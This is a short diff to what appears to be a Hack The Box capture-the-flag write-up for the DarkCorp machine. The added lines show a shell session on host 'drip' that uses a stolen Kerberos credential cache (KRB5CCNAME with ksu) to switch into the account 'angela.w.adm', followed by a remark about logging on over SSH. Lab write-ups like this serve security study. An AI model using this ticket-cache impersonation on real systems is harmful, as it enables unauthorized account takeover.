@@ -1255,8 +1255,14 @@ angela.w.adm.ccache
 Ill transfer this to the linux host
 
 ```python
-
+ebelford@drip:/tmp$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
+Authenticated angela.w.adm@DARKCORP.HTB
+Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful
+Changing uid to angela.w.adm (1730401107)
+angela.w.adm@drip:/tmp$
 ```
+
+Then after using SSH to logon
 
 
 
